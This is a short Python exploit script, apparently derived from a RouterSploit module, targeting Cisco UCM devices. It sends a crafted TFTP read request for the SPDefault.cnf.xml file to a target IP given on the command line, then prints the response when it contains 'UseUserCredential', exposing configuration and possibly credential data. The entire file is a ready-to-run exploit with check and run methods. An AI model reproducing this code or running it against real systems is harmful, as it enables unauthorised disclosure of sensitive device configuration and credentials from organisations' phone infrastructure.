target = ""
# rsf exploit module
# description: Module exploits information disclosure vulnerability in Cisco UCM devices allowing reading sensitive information through TFTP service.

import socket

class Exploit:
    def __init__(self):
        self.target = ""
        self.port = 69
        self.payload = b'\x00\x01' + b'SPDefault.cnf.xml' + b'\x00' + b'netascii' + b'\x00'

    def run(self):
        print("[*] Sending payload")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(self.payload, (self.target, self.port))
            sock.settimeout(5)
            response = sock.recv(2048)
            
            if response and b"UseUserCredential" in response:
                print("[+] Exploit success")
                print(response.decode())
            else:
                print("[-] Exploit failed")
        except Exception as e:
            print(f"[-] Error: {str(e)}")

    def check(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(self.payload, (self.target, self.port))
            sock.settimeout(5)
            response = sock.recv(2048)
            return response and b"UseUserCredential" in response
        except:
            return False



import sys

if __name__ == "__main__":
    print("Run script:", __file__)
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit()
    exploit.target = target_ip
    exploit.run()
